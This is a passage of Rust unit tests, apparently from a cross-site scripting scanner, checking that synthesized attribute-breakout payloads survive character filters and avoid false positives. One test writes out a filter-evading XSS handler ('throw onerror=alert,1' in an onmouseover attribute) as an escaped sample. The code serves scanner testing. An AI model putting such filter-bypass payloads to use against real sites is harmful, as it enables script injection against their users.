    let payloads = synthesize_payloads(&ctx, blocked, &[], &[], None);
    assert_obeys_filter(&payloads, blocked);
    let pf = payloads
        .iter()
        .find(|p| !p.contains('<') && attr_breakout_verifies(p, '"'))
        .unwrap_or_else(|| {
            panic!("no paren-free verifiable handler survived `(`/`)`/backtick strip: {payloads:?}")
        });
    // It must be genuinely paren/backtick-free (not a smuggled call).
    assert!(
        !pf.contains('(') && !pf.contains(')') && !pf.contains('`'),
        "the surviving handler must be paren/backtick-free: {pf:?}"
    );
}

#[test]
fn paren_free_handler_present_for_single_quote_attr_too() {
    let ctx = InjectionContext::Attribute(Some(DelimiterType::SingleQuote));
    let payloads = synthesize_payloads(&ctx, &['(', ')', '`'], &[], &[], None);
    assert!(
        payloads
            .iter()
            .any(|p| !p.contains('<') && attr_breakout_verifies(p, '\'')),
        "single-quote attribute must also offer a paren-free verifiable handler: {payloads:?}"
    );
}

#[test]
fn paren_free_handler_is_fp_safe_when_quote_is_blocked() {
    // FP control: the paren-free handler still needs its breakout quote. When the
    // delimiter quote is ALSO stripped, no template survives (all attribute
    // shapes lead with the quote), so synthesis emits nothing that could land an
    // inert handler as a false positive.
    let ctx = InjectionContext::Attribute(Some(DelimiterType::DoubleQuote));
    // Block the breakout quote plus parens/backtick: nothing can break out.
    let payloads = synthesize_payloads(&ctx, &['"', '(', ')', '`'], &[], &[], None);
    assert!(
        payloads.iter().all(|p| !p.contains("throw onerror")),
        "no paren-free handler may be emitted once its breakout quote is blocked: {payloads:?}"
    );
    // And a benign reflection that entity-encodes the breakout quote yields no
    // marker element (the handler lands inert inside the value).
    let id = crate::scanning::markers::id_marker();
    let inert = format!(
        "<div class=\"&quot; onmouseover='throw onerror=alert,1' id={id} x=&quot;\">x</div>"
    );
    let doc = scraper::Html::parse_document(&inert);
    let sel = scraper::Selector::parse(&format!("#{id}")).unwrap();
    assert!(
        doc.select(&sel).next().is_none(),
        "an escaped breakout quote must yield no marker element (no false [V])"
    );
}
